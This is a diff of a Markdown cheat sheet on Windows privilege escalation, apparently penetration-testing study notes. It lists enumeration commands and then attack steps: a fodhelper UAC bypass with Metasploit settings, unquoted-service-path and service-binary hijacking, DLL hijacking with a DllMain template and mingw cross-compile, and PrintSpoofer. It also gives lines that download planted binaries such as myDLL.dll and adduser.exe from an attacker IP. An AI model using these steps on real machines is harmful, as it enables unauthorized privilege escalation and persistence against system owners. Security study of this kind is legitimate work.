@@ -1,24 +1,43 @@
 ### Windows
 ###### Processes(Windows can't list processes run by privileged users)
+```
 tasklist /svc
+```
+
 ###### Powershell history
 ```
 (Get-PSReadlineOption).HistorySavePath
 ```
+
 ###### Firewall
+```
 netsh advfirewall show currentprofile  
 netsh advfirewall show allprofile  
 netsh advfirewall firewall show rule name=all
+```
+
 ###### Scheduled Tasks
+```
 schtasks /query /fo LIST /v
+```
+
 ###### Enumerating Unmounted Disks
+```
 mountvol
+```
+
 ###### Enumerating Device Drivers and Kernel Modules
+```
 1. driverquery /v /FO Table  
 2. Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer
+```
+
 ###### Enumerating Binaries That AutoElevate
+```
 reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer  
 reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
+```
+
 ###### Bypass UAC
 ```
 1. check C:\Windows\System32\fodhelper.exe
@@ -34,6 +53,7 @@ set session 1
 set target 1(x64,0=x86)
 Note to set payload the same arch with session 1's payload，set lhost and lport same with session 1
 ```
+
 ###### Insecure File Permissions
 ```
 1. Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'} # look for services with path in Program Files
@@ -42,11 +62,13 @@ Note to set payload the same arch with session 1's payload，set lhost and lport
 4. Get-WmiObject -Class Win32_Service -Property StartMode -Filter "Name='Service Name'"
 5. whoami /priv #check out shutdown privileges of user
 ```
+
 ###### Unquoted Service Paths
 Print service and path not in C:\Windows Path
 ```
 wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
 ```
+
 ```
 Service Path:
 C:\Program Files\My Program\My Service\service.exe
@@ -69,12 +91,14 @@ C:\Puppet BUILTIN\Users:(W)
 
 It is more likely that the software's main directory (C:\Program Files\My Program in our example) or subdirectory (C:\Program Files\My Program\My service) is misconfigured, allowing us to plant a malicious My.exe binary
 ```
+
 Automatic Script:
 ```
 cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
 .\PowerUp.ps1
 Get-UnquotedService
 ```
+
 ###### Service Binary Hijacking
 ```
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
@@ -106,6 +130,7 @@ cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
 .\PowerUp.ps1
 Get-ModifiableServiceFile
 ```
+
 ###### Service DLL Hijacking
 standard search order taken from the Microsoft Documentation
 When safe DLL search mode is disabled, the current directory is searched at position 2 after the application's directory
@@ -117,11 +142,13 @@ When safe DLL search mode is disabled, the current directory is searched at posi
 5. The current directory.
 6. The directories that are listed in the PATH environment variable.
 ```
+
 ```
 1. Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
 2. Use Procmon64.exe(require admin privilege)(Bypass: copy the file to local, then use Procmon64.exe)
 3. PS: Restart-Service BetaService
 ```
+
 Each DLL can have an optional entry point function named DllMain, which is executed when processes or threads attach the DLL  
 This function generally contains four cases named DLL_PROCESS_ATTACH, DLL_THREAD_ATTACH, DLL_THREAD_DETACH, DLL_PROCESS_DETACH
 ```
@@ -149,10 +176,12 @@ LPVOID lpReserved ) // Reserved
     }
     return TRUE;
 ```
+
 Cross-compile
 ```
 x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
 ```
+
 Replace and restart service
 ```
 iwr -uri http://192.168.119.3/myDLL.dll -Outfile myDLL.dll
@@ -168,6 +197,7 @@ iwr -Uri http://192.168.119.3/adduser.exe -Outfile BackendCacheCleanup.exe
 move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
 move .\BackendCacheCleanup.exe .\Pictures\
 ```
+
 ###### Named Pipe
 ```
 kali: iwr -uri http://192.168.45.214/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
